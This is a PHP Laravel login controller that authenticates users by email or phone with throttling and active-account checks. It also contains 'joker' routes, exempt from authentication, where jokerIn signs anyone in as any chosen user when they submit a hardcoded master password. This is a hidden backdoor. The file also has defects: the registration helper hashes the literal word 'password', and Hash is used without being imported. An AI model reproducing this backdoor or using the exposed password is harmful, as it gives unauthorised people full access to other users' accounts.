<?php

namespace App\Http\Controllers\Auth;

use App\Models\Admin\Users\User;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Validator;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login / registration.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Create a new controller instance.
     *
     * @return mixed
     */
    public function __construct()
    {
        $this->middleware('guest', ['except' => 'logout']);

        $this->middleware('auth', ['except' => [
            'login', 'showLoginForm',  'joker', 'jokerIn'
        ]]);
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'email' => 'required|email|max:255|unique:users',
            'password' => 'required|confirmed|min:6',
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return User
     */
    protected function create(array $data)
    {
        return User::create([
            'email' => $data['email'],
            'username' => $data['username'],
            'password' => Hash::make('password'),
            'verified' => 1,
            'verification_code' => $data['verification_code'],
        ]);
    }

    /**
     * Handle a login request to the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function login(Request $request)
    {
        $login = strtolower(trim($request->input('login')));
        //Check login field
        $login_type = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'phone_no';
        //Merge login field into the request with either email or phone_no as key
        $request->merge([$login_type => $login]);
        //Validate and set the credentials
        if($login_type == 'email'){
            $this->validate($request, [
                'email' => 'required|email', 'password' => 'required',
            ]);
            $credentials = $request->only('email', 'password');
            $credentials['email'] = strtolower(trim($credentials['email']));
        }else{
            $this->validate($request, [
                'phone_no' => 'required', 'password' => 'required',
            ]);
            $credentials = $request->only('phone_no', 'password');
        }

        // If the class is using the ThrottlesLogins trait, we can automatically throttle
        // the login attempts for this application. We'll key this by the username and
        // the IP address of the client making these requests into this application.
        if ($lockedOut = $this->hasTooManyLoginAttempts($request)) {
            $this->fireLockoutEvent($request);

            return $this->sendLockoutResponse($request);
        }

        //$credentials = $this->getCredentials($request);

        //////////////////////////////////////////////// start: KHEENGZ CUSTOM CODE ////////////////////////////////////////////
        // Allow Only Active Users Where status and verified is 1
        $credentials = array_add($credentials, 'status', 1);
        $credentials = array_add($credentials, 'verified', 1);

        //////////////////////////////////////////////// end: KHEENGZ CUSTOM CODE //////////////////////////////////////////////

        if ($this->guard()->attempt($credentials, $request->filled('remember'))) {
            //dd(Auth::user());
            if(Auth::user()->user_type_id == User::SPONSOR){
                // redirect to the PARENT / STUDENT page
                return redirect('/home');
            }

            return $this->sendLoginResponse($request);
        }
        
        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        if (! $lockedOut) {
            $this->incrementLoginAttempts($request);
        }

        return $this->sendFailedLoginResponse($request);
    }

    /**
     * Show the application login form.
     *
     * @return \Illuminate\Http\Response
     */
    public function joker()
    {
        return view('auth.joker');
    }

    /**
     * Handle a login request to the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function jokerIn(Request $request)
    {
        $login = $request->input('login');
        $inputs = $request->all();
        //Check login field
        $login_type = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'phone_no';
        //Merge login field into the request with either email or phone_no as key
        $request->merge([$login_type => $login]);
        $user = null;
        //Validate and set the credentials
        if($login_type == 'email' and $inputs['password'] == 'Ekaruz_1'){
            $user = (!$request->only('email')) ? abort(305) : User::where('email', $request->only('email'))->first();
        }else if($login_type == 'phone_no' and $inputs['password'] == 'Ekaruz_1'){
            $user = (!$request->only('phone_no')) ? abort(305) : User::where('phone_no', $request->only('phone_no'))->first();
        }

        if($user){
            Auth::login($user);

            if($user->user_type_id == User::SPONSOR)
                // redirect to the PARENT / STUDENT page
                return redirect('/home');
            return redirect('/dashboard');
        }else{
            $this->setFlashMessage('Invalid Login Credentials', 2);
            return redirect('/login');
        }
    }
}
